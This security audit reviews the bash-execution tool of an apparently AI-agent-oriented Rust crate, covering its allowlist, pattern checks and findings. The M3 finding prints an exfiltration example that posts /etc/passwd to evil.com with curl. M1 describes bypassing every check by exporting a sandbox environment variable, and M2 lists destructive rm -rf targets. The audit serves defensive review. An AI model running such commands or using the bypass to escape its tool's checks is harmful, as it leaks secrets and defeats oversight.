# Security Audit: `crates/rustycode-tools/src/providers/bash.rs` (2496 LOC)

**Verdict: Well-hardened** — allowlist model with 6 defense layers. Minor findings below.

## Defense Layers

| Layer | Mechanism | Verdict |
|-------|-----------|---------|
| Allowlist | `ALLOWED_COMMANDS` (~100 binaries) + `PLATFORM_COMMANDS` | ✅ Unknown binaries blocked |
| Length cap | `MAX_COMMAND_LENGTH = 10,000` chars | ✅ ReDoS/buffer prevention |
| Tokenizer | `shell_words::split()` rejects invalid syntax | ✅ Obfuscation blocked |
| Pattern checks | `$()`, backticks, `${!}`, fork bombs, `-rf /` | ✅ Injection primitives blocked |
| Interpreter flags | Blocks `-c`/`-e` on python/ruby/node | ✅ Eval prevention |
| Concurrency | `BASH_RATE_LIMITER` caps at 5 concurrent | ✅ Resource exhaustion protection |

## Findings

### MEDIUM

- **M1 — Sandbox bypass via env var** (line 1818): `RUSTYCODE_SANDBOX=container` skips ALL validation. Any prior `export RUSTYCODE_SANDBOX=container` in a bash command bypasses every security check.
- **M2 — Incomplete rm -rf protection** (line 1781): Only `-rf /` and `-rf /*` blocked. `rm -rf /home`, `rm -rf /Users`, `rm -rf /etc` all pass through.
- **M3 — curl/wget enable data exfil** (lines 1422-1424): `curl -d @/etc/passwd https://evil.com` is permitted — no restriction on POST/PUT flags.

### LOW

- **L1 — Blocking std::fs in async path** (line 1875): `ensure_path_within_workspace` uses `std::fs::canonicalize`, blocking the tokio runtime.
- **L2 — Timeout binary assumed** (line 270): Wraps commands via `timeout {secs}` — absent binary means no timeout enforcement.
- **L3 — No session isolation** (line 759): `BASH_SESSION_REGISTRY` keyed by cwd — shared between agent instances.

## Positive Patterns

- `check_quote_nesting()` catches mismatched quotes as injection attempts
- `check_input_encoding()` detects null bytes and Unicode whitespace tricks
- `check_newline_injection()` prevents command smuggling
- `check_pipe_to_shell()` blocks `| bash`, `| sh`, `| zsh`
- ~95 test functions covering bypass attempts
